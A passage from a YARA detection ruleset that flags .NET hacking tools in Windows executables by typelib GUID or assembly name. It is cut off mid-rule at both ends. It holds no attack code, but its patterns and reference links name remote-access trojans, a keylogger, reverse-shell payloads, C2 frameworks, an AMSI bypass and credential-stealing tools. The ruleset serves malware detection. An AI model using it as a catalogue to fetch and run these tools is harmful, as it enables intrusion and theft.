\"aa61a166-31ef-429d-a971-ca654cd18c3b\" ascii nocase wide\n        $typelibguid1 = \"0dc1b824-c6e7-4881-8788-35aecb34d227\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpReg {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpReg\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"8ef25b00-ed6a-4464-bdec-17281a4aa52f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_MemeVM {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TobitoFatitoRE/MemeVM\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"ef18f7f2-1f03-481c-98f9-4a18a2f12c11\" ascii nocase wide\n        $typelibguid1 = \"77b2c83b-ca34-4738-9384-c52f0121647c\" ascii nocase wide\n        $typelibguid2 = \"14d5d12e-9a32-4516-904e-df3393626317\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpDir {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpDir\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"c7a07532-12a3-4f6a-a342-161bb060b789\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AtYourService {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mitchmoser/AtYourService\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"bc72386f-8b4c-44de-99b7-b06a8de3ce3f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LockLess {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/LockLess\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"a91421cb-7909-4383-ba43-c2992bbbac22\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EasyNet {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/EasyNet\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"3097d856-25c2-42c9-8d59-2cdad8e8ea12\" ascii nocase wide\n        $typelibguid1 = \"ba33f716-91e0-4cf7-b9bd-b4d558f9a173\" ascii nocase wide\n        $typelibguid2 = \"37d6dd3f-5457-4d8b-a2e1-c7b156b176e5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpByeBear {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/S3cur3Th1sSh1t/SharpByeBear\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"a6b84e35-2112-4df2-a31b-50fde4458c5e\" ascii nocase wide\n        $typelibguid1 = \"3e82f538-6336-4fff-aeec-e774676205da\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpHide {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/outflanknl/SharpHide\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"443d8cbf-899c-4c22-b4f6-b7ac202d4e37\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSvc {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpSvc\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"52856b03-5acd-45e0-828e-13ccb16942d1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCrashEventLog {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/slyd0g/SharpCrashEventLog\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"98cb495f-4d47-4722-b08f-cefab2282b18\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DotNetToJScript_LanguageModeBreakout {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/DotNetToJScript-LanguageModeBreakout\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"deadb33f-fa94-41b5-813d-e72d8677a0cf\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharPermission {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mitchmoser/SharPermission\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"84d2b661-3267-49c8-9f51-8f72f21aea47\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RegistryStrikesBack {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/RegistryStrikesBack\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"90ebd469-d780-4431-9bd8-014b00057665\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CloneVault {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/CloneVault\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"0a344f52-6780-4d10-9a4a-cb9439f9d3de\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_donut {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/donut\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"98ca74c7-a074-434d-9772-75896e73ceaa\" ascii nocase wide\n        $typelibguid1 = \"3c9a6b88-bed2-4ba8-964c-77ec29bf1846\" ascii nocase wide\n        $typelibguid2 = \"4fcdf3a3-aeef-43ea-9297-0d3bde3bdad2\" ascii nocase wide\n        $typelibguid3 = \"361c69f5-7885-4931-949a-b91eeab170e3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpHandler {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jfmaes/SharpHandler\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"46e39aed-0cff-47c6-8a63-6826f147d7bd\" ascii nocase wide\n        $typelibguid1 = \"11dc83c6-8186-4887-b228-9dc4fd281a23\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Driver_Template {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/Driver-Template\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"bdb79ad6-639f-4dc2-8b8a-cd9107da3d69\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_NashaVM {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Mrakovic-ORG/NashaVM\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"f9e63498-6e92-4afd-8c13-4f63a3d964c3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or\n    organization, as long as you use it under this license.\n*/\n\n\n// low hanging fruits ;)\n\nrule HKTL_NET_NAME_FakeFileMaker {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/FakeFileMaker\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"FakeFileMaker\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_Aggressor {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/k8gege/Aggressor\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Aggressor\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_pentestscripts {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/c4bbage/pentestscripts\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"pentestscripts\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_WMIPersistence {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/mdsecactivebreach/WMIPersistence\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"WMIPersistence\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_ADCollector {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/dev-2null/ADCollector\"\n        hash = \"5391239f479c26e699b6f3a1d6a0a8aa1a0cf9a8\"\n        hash = \"9dd0f322dd57b906da1e543c44e764954704abae\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ADCollector\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_MaliciousClickOnceGenerator {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Mr-Un1k0d3r/MaliciousClickOnceGenerator\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"MaliciousClickOnceGenerator\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_directInjectorPOC {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/badBounty/directInjectorPOC\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"directInjectorPOC\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_AsStrongAsFuck {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Charterino/AsStrongAsFuck\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"AsStrongAsFuck\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_MagentoScanner {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/soufianetahiri/MagentoScanner\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"MagentoScanner\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RevengeRAT_Stub_CSsharp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/NYAN-x-CAT/RevengeRAT-Stub-CSsharp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RevengeRAT-Stub-CSsharp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharPyShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/antonioCoco/SharPyShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharPyShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_GhostLoader {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/TheWover/GhostLoader\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"GhostLoader\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_DotNetInject {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/dtrizna/DotNetInject\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"DotNetInject\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_ATPMiniDump {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/b4rtik/ATPMiniDump\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ATPMiniDump\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_ConfuserEx {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/yck1509/ConfuserEx\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ConfuserEx\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpBuster {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/passthehashbrowns/SharpBuster\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpBuster\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_AmsiBypass {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/0xB455/AmsiBypass\"\n\t\thash = \"8fa4ba512b34a898c4564a8eac254b6a786d195b\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"AmsiBypass\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_Recon_AD {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/outflanknl/Recon-AD\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Recon-AD\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpWatchdogs {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/RITRedteam/SharpWatchdogs\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpWatchdogs\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpCat {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Cn33liz/SharpCat\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpCat\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_aspnetcore_bypassing_authentication {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/jackowild/aspnetcore-bypassing-authentication\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"aspnetcore-bypassing-authentication\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_K8tools {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/k8gege/K8tools\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"K8tools\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_HTTPSBeaconShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/limbenjamin/HTTPSBeaconShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"HTTPSBeaconShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_Ghostpack_CompiledBinaries {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/r3motecontrol/Ghostpack-CompiledBinaries\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Ghostpack-CompiledBinaries\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_metasploit_sharp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/VolatileMindsLLC/metasploit-sharp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"metasploit-sharp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_trevorc2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/trustedsec/trevorc2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"trevorc2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_petaqc2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/fozavci/petaqc2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"petaqc2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_DNS2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_DNS2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_DNS2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_cve_2017_7269_tool {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/zcgonvh/cve-2017-7269-tool\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"cve-2017-7269-tool\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_AggressiveProxy {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/EncodeGroup/AggressiveProxy\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"AggressiveProxy\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_MSBuildAPICaller {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/rvrsh3ll/MSBuildAPICaller\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"MSBuildAPICaller\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_GrayKeylogger {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DarkSecDevelopers/GrayKeylogger\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"GrayKeylogger\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_weevely3 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/epinna/weevely3\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"weevely3\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_FudgeC2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Ziconius/FudgeC2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"FudgeC2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_Reverse_tcp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_Reverse_tcp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_Reverse_tcp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpHose {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/ustayready/SharpHose\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpHose\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RAT_NjRat_0_7d_modded_source_code {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/AliBawazeEer/RAT-NjRat-0.7d-modded-source-code\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RAT-NjRat-0.7d-modded-source-code\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RdpThief {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/0x09AL/RdpThief\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RdpThief\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RunasCs {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/antonioCoco/RunasCs\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RunasCs\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_IP6DNS {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_IP6DNS\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_IP6DNS\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_ARP {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_ARP\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_ARP\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_C2Bridge {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/cobbr/C2Bridge\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"C2Bridge\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_Infrastructure_Assessment {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/NyaMeeEain/Infrastructure-Assessment\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Infrastructure-Assessment\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_shellcodeTester {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/tophertimzen/shellcodeTester\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"shellcodeTester\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and 